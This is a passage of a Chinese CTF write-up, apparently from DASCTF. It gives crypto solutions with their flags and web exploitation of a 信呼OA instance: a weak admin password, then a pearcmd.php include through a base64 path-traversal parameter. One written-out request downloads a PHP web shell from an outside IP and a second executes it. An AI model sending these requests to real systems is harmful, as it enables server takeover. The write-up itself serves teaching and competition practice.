    import sympy
    c1 = 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059
    y = 449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839
    x = sympy.discrete_log(y,c1,2)
    print(x)
> 得到`x`后，利用`sage`解方程就可以得到`p`
    y = 449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839
    x = 43776275628859890575232443794319298551934804213472744927022818696759188901977390266973172755658396197421139420206549889337117978597883154859965236605452518446448639813055134133587564045471804447818058571586426895800984805588363855865218690877547419152765512143095217413477343835473963637692441032136163289964756172316289469159500312630529091350636808491697553069388388303341623047737553556123142002737059936569931163197364571478509576816349348146215101250803826590694039096063858424405382950769415272111843039715632655831594224288099608827345377164375927559338153505991404973888594356664393487249819589915881178770048740
    R. = Zmod(y)[]
    f = 2019*n**2 + 2020*n**3 + 2021*n**4 - x
    f.roots()
> 之后利用参数关系代换就能拿到本题的`Flag`
    证明过程：
    c = m ** e mod n
    dp = d mod (p-1)
    c**dp = m**(e*dp) mod n
    c**dp mod p = m**(e*dp) mod p
    e*dp = e*d mod (p-1) = 1 mod (p-1)
    c**dp mod p = m**(1+k*(p-1)) mod p
    解题代码：
    p = 12131601165788024635030034921084070470053842112984866821070395281728468805072716002494427632757418621194662541766157553264889658892783635499016425528807741
    c = 57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425
    dp = 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473
    sage: print(long_to_bytes(pow(c,dp,p)))
    b'DASCTF{98d923h4344e3bf72f8775xy65tvftv5}'
###  unknown_dsa
> `Pell`方程和`DSA`结合的题目，先求解一下`Pell`方程来获取`ul`和`vl`
    def Pell(N, tryNumber = 100):
        m = continued_fraction(sqrt(N))
        for i in range(tryNumber):
            denom = m.denominator(i)
            num = m.numerator(i)
            if num ^ 2 - N * denom ^ 2 == 1:
                return num, denom
        return None, None
    Pell(4013184893)
> 接着进一步来获取`m1 m2`
    import gmpy2
    import libnum
    import hashlib
    from functools import reduce
    def CRT(eq):
        return reduce(uni, eq)
    def exgcd(a, b):
        if b == 0: return 1, 0
        x, y = exgcd(b, a % b)
        return y, x - a // b * y
    def uni(P, Q):
        r1, m1 = P
        r2, m2 = Q
        d = gmpy2.gcd(m1, m2)
        assert (r2 - r1) % d == 0
        l1, l2 = exgcd(m1 // d, m2 // d)
        return (r1 + (r2 - r1) // d * l1 * m1) % gmpy2.lcm(m1, m2), gmpy2.lcm(m1, m2)
    if __name__ == "__main__":
        ms1 = [10537190383977432819948602717449313819513015810464463348450662860435011008001132238851729268032889296600248226221086420035262540732157097949791756421026015741477785995033447663038515248071740991264311479066137102975721041822067496462240009190564238288281272874966280, 121723653124334943327337351369224143389428692536182586690052931548156177466437320964701609590004825981378294358781446032392886186351422728173975231719924841105480990927174913175897972732532233, 1440176324831562539183617425199117363244429114385437232965257039323873256269894716229817484088631407074328498896710966713912857642565350306252498754145253802734893404773499918668829576304890397994277568525506501428687843547083479356423917301477033624346211335450]
        cs1 =  [2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704, 21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961, 301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424]
        ms2 = [168450500310972930707208583777353845862723614274337696968629340838437927919365973736431467737825931894403582133125917579196621697175572833671789075169621831768398654909584273636143519940165648838850012943578686057625415421266321405275952938776845012046586285747, 1921455776649552079281304558665818887261070948261008212148121820969448652705855804423423681848341600084863078530401518931263150887409200101780191600802601105030806253998955929263882382004, 25220695816897075916217095856631009012504127590059436393692101250418226097323331193222730091563032067314889286051745468263446649323295355350101318199942950223572194027189199046045156046295274639977052585768365501640340023356756783359924935106074017605019787]
        cs2 = [148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144, 1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256, 10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842]
        m1, mod1 = CRT(zip(cs1,ms1))
        print(m1, mod1)
        print(gmpy2.iroot(m1,7))
        print(libnum.n2s(int(8382905590662478666595114136929713707132131361720892331048437274828529226704174)))
        m2, mod2 = CRT(zip(cs2, ms2))
        print(m2, mod2)
        print(gmpy2.iroot(m2, 7))
        print(libnum.n2s(int(10336852405630488944198347577475266693234960398137850045398990629116544863921454)))
> 利用`p * q`与`(p - 1) / q`来获取`p、q`
>
> 利用如下公式进行做差求解来获取`k`的值后便可直接求得左半部分和右半部分`Flag`的值  
>  
>  \s1 \equiv (hm1+x1 _r1)_ k^{-1}(mod \ q)  
>  \s2 \equiv (hm2+x1 _r1)_ k^{-1}(mod \ q)  
>
    import gmpy2
    import libnum
    q = 895513916279543445314258868563331268261201605181
    p = 95139353880772104939870618145448234251031105153406565833029787299040378395002190438381537974853777890692924407167823818980082672873538133127131356810153012924025270883966172420658777903337576027105954119811495411149092960422055445121097259802686960288258399754185484307350305454788837702363971523085335074839
    t = 60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548
    n = p * q
    tp = p * q - (p + q)
    r1 = 498841194617327650445431051685964174399227739376
    r2 = 620827881415493136309071302986914844220776856282
    s1 = 376599166921876118994132185660203151983500670896
    s2 = 187705159843973102963593151204361139335048329243
    s3 = 674735360250004315267988424435741132047607535029
    hm1 = 63998600246749767922010292163233985055258508821
    hm2 = 1121013631791355094793010532678158450130791457285
    differenceOfS = s1 - s2
    differenceOfM = hm1 - hm2
    k = gmpy2.mul(differenceOfM, gmpy2.invert(differenceOfS, q)) % q
    x1 = (s1 * k -hm1) * gmpy2.invert(r1, q) % q
    x2 = (s3 * k - hm1) * gmpy2.invert(r2, q) % q
    flag = ''
    flag = libnum.n2s(int(x1)) + libnum.n2s(int(x2))
    print(flag)
    DASCTF{f11bad18f529750fe52c56eed85d001b}
## Web
###  OA?RCE?
访问是个信呼OA，直接弱口令跑一波发现后台密码 `admin` `admin123`,登陆后台。
试了下网上的几个洞发现都打不通，审计源码。
在indexAction.php发现有查看phpinfo函数。
    public function phpinfoAction()
      {
        $this->display = false;
        phpinfo();
      }
通过`?m=index&a=phpinfo`调用该函数，查看phpinfo。
这里发现`register_argc_argv`开启，想到之前某次比赛打pearcmd下载文件getshell。参考博客[ctfshow 萌新22
（类似级客巅峰web4） – 灰信网（软件开发博客聚合）
(freesion.com)](https://www.freesion.com/article/58841365372/)
题目开启了register_argc_argv可以通过+来分隔命令，先进行包含pearcmd.php然后在通过+分隔符来执行download命令。现在还差一个文件包含点来满足博客中`include`。
继续审计代码发现`contain()`可以用来进行包含。
    public function getshtmlAction()
      {
       $surl = $this->jm->base64decode($this->get('surl'));
       $num  = $this->get('num');
       $menuname  = $this->jm->base64decode($this->get('menuname'));
       if(isempt($surl))exit('not found');
       $file = ''.P.'/'.$surl.'.php';
       if(!file_exists($file))$file = ''.P.'/'.$surl.'.shtml';
       if(!file_exists($file))exit('404 not found '.$surl.'');
       if(contain($surl,'home/index/rock_index'))$this->showhomeitems();//首页的显示
       $this->displayfile = $file;
       //记录打开菜单日志
       if($num!='home' && getconfig('useropt')=='1')
         m('log')->addlog('打开菜单', '菜单['.$num.'.'.$menuname.']');
      }
条件满足，且构造payload文件末尾已附加`php`，且`surl`进行base64编码
写个shell`1.php`在服务器上
发包
    ?m=index&a=getshtml&surl=Li4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA==&+install+-R+/tmp+http://185.194.148.106:8000/1.php
成功下载
之后再访问shell的路径
?m=index&a=getshtml&surl=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3RtcC9wZWFyL2Rvd25sb2FkLzE=
getshell
###  EZupload
访问，注释发现源代码
得到源码
    setTempDirectory('tempdir');
    $policy = new Latte\Sandbox\SecurityPolicy;
    $policy->allowMacros(['block', 'if', 'else','=']);
    $policy->allowFilters($policy::ALL);